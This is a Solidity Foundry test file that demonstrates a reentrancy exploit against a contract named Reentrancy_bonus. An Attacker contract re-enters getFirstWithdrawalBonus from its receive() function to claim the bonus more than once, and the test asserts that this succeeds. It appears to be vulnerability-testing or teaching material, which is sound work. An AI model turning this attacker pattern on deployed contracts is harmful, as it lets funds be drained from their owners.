
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Reentrancy_bonus} from "../src/Reentrancy_bonus.sol";

contract TestReentrancyReentrancy_bonus is Test {
    Reentrancy_bonus public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new Reentrancy_bonus();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes() public {
        uint256 bonusAmount = 100;
        
        // Fund the victim contract so it has ETH to send as bonus
        vm.deal(address(_contractUnderTest), bonusAmount * 10);

        // Trigger the attack
        _attacker.attack();

        // Verify the exploit succeeded - attacker received bonus multiple times
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
        assertGt(_attacker.attackCallCount(), 1, "Reentrancy did not occur - function was only called once");
    }

    receive() external payable {}
}

contract Attacker {
    Reentrancy_bonus public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public totalReceived;

    constructor(address victimAddress) {
        victim = Reentrancy_bonus(victimAddress);
    }

    function attack() public {
        attackCallCount = 0;
        exploitSucceeded = false;
        totalReceived = 0;

        // Call the vulnerable function - this will trigger the reentrancy
        victim.getFirstWithdrawalBonus(address(this));

        // If we received the bonus more than once, the exploit succeeded
        // The vulnerability allows us to call getFirstWithdrawalBonus multiple times
        // because claimedBonus[recipient] is set to true AFTER the external call
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        totalReceived += msg.value;

        // Re-enter: try to claim the bonus again before claimedBonus is set to true
        // Limit to 2 calls to avoid running out of gas
        if (attackCallCount < 2) {
            victim.getFirstWithdrawalBonus(address(this));
        }
    }
}
